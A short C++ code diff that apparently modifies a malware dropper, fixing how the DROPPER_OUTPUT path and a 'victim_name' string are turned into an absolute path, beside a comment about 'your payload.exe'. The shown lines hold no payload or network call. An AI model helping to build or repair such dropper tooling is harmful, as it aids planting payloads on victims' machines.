@@ -25,6 +25,7 @@
 #include<time.h>		// rand seed
 #include<map>
 #include<string>
+#include<cstring>
 #include<algorithm>
 #include<vector>
 #include<filesystem>
@@ -61,9 +62,13 @@ void set_name();
 char name[10 * NAME_SIZE];
 
 // (char*) C:\\example\\path\\to\\your\\payload.exe
-std::filesystem::path relative_file_path_name = DROPPER_OUTPUT;
+std::filesystem::path relative_file_path_name = std::filesystem::absolute(DROPPER_OUTPUT);
 
-char* victim_name = (char*) std::filesystem::absolute(&relative_file_path_name);
+std::string absolute_victim_name = relative_file_path_name.string();
+
+char* victim_name = new char[absolute_victim_name.size() + 1];
+
+strcpy(victim_name, absolute_victim_name.c_str());
 
 // Entry Point
 int main(int argc, char* argv[])
